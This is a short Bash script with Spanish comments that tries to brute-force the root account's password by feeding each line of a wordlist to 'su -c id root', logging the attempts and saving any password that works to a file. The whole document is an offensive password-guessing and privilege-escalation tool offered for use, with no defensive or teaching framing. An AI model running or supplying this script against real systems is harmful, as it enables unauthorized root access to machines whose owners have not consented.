`#!/bin/bash`

`#Archivo con lista de contraseñas (una por línea)`

`WORDLIST="diccionario.txt"`

#`Usuario al que intentar acceder`

`USER="root"`

`#Archivo para guardar contraseñas probadas`

`LOGFILE="su_bruteforce.log"`

#`Intentar cada password`

`while IFS= read -r password; do
echo "Probando contraseña: $password"`

`# Intentar hacer su con password (timeout 5s para no colgar)
echo "$password" | timeout 5 su -c "id" $USER 2>/dev/null >/dev/null

# Revisar código de salida (0 = éxito)
if [ $? -eq 0 ]; then
    echo "Contraseña encontrada: $password"
    echo "$password" > success_password.txt
    exit 0
fi`

`done < "$WORDLIST"`

`echo "No se encontró la contraseña en el diccionario."
exit 1`
